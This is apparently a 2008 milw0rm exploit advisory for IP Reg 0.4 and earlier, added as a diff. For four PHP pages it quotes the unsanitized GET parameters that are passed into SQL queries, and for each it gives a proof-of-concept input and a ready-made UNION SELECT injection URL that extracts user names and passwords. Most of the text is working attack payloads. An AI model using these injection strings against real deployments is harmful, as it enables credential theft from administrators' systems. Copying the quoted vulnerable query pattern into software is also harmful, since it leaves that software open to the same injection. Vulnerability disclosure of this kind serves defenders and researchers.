@@ -1,0 +1,61 @@
+# IP Reg <= 0.4 Multiple Remote SQL Injection Vulnerabilities
+# url: http://sourceforge.net/projects/ipreg/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: All Hackers and milw0rm website
+
+-------------------------
+
+vuln file: /locationdel.php
+vuln code:
+27: $location_id = $_GET['location_id'];
+xx: ...
+42: $result = mysql_query("SELECT location_name FROM location WHERE location_id='$location_id'") or die(mysql_error());
+
+PoC:     /locationdel.php?location_id='[foo]
+Exploit: /locationdel.php?location_id='+union+all+select+concat(user_name,char(58),user_pass)+from+user/*
+
+-------------------------
+
+vuln file: /vlanview.php
+vuln code:
+27: $vlan_id = $_GET['vlan_id'];
+xx: ...
+42: $result = mysql_query("SELECT vlan_name, vlan_number, vlan_info FROM vlan WHERE vlan_id='$vlan_id'") or die(mysql_error
+    ());
+
+PoC:     /vlanview.php?vlan_id='[foo]
+Exploit: /vlanview.php?vlan_id='+union+all+select+1,1,concat(user_name,char(58),user_pass)+from+user/*
+
+-------------------------
+
+vuln file: /vlanedit.php
+vuln code:
+27: $vlan_id = $_GET['vlan_id'];
+xx: ...
+42: $result = mysql_query("SELECT vlan_name, vlan_number, vlan_info FROM vlan WHERE vlan_id='$vlan_id'") or die(mysql_error
+    ());
+
+PoC:     /vlanedit.php?vlan_id='[foo]
+Exploit: /vlanedit.php?vlan_id='+union+all+select+1,1,concat(user_name,char(58),user_pass)+from+user/*
+
+-------------------------
+
+vuln file: /vlandel.php
+vuln code:
+27: $vlan_id = $_GET['vlan_id'];
+xx: ...
+42: $result = mysql_query("SELECT vlan_id, vlan_name, vlan_number FROM vlan WHERE vlan_id='$vlan_id'") or die(mysql_error
+    ());
+
+PoC:     /vlandel.php?vlan_id='[foo]
+Exploit: /vlandel.php?vlan_id='+union+all+select+1,1,concat(user_name,char(58),user_pass)+from+user/*
+
+# milw0rm.com [2008-10-16]
